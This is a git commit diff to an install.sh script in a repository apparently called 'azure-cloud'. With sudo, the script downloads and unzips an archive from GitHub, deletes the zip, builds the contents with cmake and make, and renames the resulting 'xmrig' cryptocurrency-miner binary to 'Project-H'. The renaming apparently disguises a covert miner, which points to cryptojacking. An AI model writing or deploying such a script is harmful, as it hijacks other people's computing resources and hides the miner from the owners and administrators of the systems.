5126339349274869b3ec2a3ebfd02a0a4769d88d
U117A <33190250+U117A@users.noreply.github.com>
2020-08-22 09:08:23 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,4 +7,11 @@ sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
 sudo unzip AAA.zip
 #sudo rm -rf "$HOME"/AAA #IF****
 #sudo mv AAA "$HOME"
-#sudo rm -rf AAA.zip
+sudo rm -rf AAA.zip
+
+cd AAA
+mkdir build
+cd build
+cmake ..
+make
+sudo mv xmrig Project-H
